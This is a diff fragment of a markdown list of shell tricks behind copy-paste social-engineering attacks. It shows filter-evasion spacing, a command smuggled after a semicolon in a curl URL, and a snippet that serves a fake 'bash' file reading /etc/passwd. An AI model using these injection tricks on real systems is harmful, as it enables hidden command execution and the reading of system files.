@@ -17,7 +17,7 @@ Copypaste social-engineering code execution
 `echo$IFS$9a`  
 #### piping without pipes  
 `wc -l < <(ls)`     
-#### starting code execution in unescaped url without ampersand
+#### starting code execution without ampersand
 `curl http://localhost/;whoami`
 #### redirecting to a hidden exploit  
 `mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd .`  
